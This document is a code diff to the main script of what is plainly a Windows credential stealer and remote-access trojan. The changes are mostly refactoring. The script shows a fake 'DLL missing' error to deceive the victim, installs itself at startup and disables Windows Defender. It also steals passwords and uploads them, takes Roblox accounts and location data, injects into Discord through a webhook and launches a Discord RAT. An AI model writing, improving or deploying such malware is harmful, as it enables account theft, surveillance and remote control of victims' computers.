@@ -1,4 +1,3 @@
-import requirements_installation
 import _webhook
 import discordc
 import informations
@@ -6,10 +5,10 @@ import malicious
 import rat
 import InjectX
 import startup
+import _roblox
+import disable_defender
 from config import Config
-from _roblox import RobloxX
 from anonFile import uploadToAnonfiles
-from disable_defender import disabledefender
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
@@ -40,20 +39,24 @@ try:
     from Crypto.Cipher import AES
     from PIL import ImageGrab
 except Exception:
-    requirementsinstallation()
+    if cc.get_install_requirements_with_py() is True:
+        import requirements_installation
+        requirements_installation.requirementsinstallation()
+    else:
+        pass
 
 
 if platform.system() != "Windows":
     sys.exit()
 
-if cc.get_fake_error() == True:
+if cc.get_fake_error() is True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
-if cc.get_start_up() == True:
+if cc.get_start_up() is True:
     startup.StartUp()
     
-if cc.get_disable_windows_defender() == True:
-    disabledefender()
+if cc.get_disable_windows_defender() is True:
+    disable_defender.disabledefender()
 
 
 def writeforfile(data, name):
@@ -856,17 +859,17 @@ if cc.get_password_stealing() is True:
     print(filetext)
     upload("kiwi", filetext)
 
-if cc.get_malicious_stealing() == True:
+if cc.get_malicious_stealing() is True:
     send_malicious()
 
-if cc.get_injection() == True:
+if cc.get_injection() is True:
     InjectX.InjectionX(webhook)
 
-if cc.get_roblox_stealing() == True:
-    RobloxX().run()
+if cc.get_roblox_stealing() is True:
+    _roblox.RobloxX().run()
 
-if cc.get_location_stealing() == True:
+if cc.get_location_stealing() is True:
     _webh.locations_webhook(ii.global_info())
 
-if cc.get_discord_rat() == True:
+if cc.get_discord_rat() is True:
     rat.run_rat()
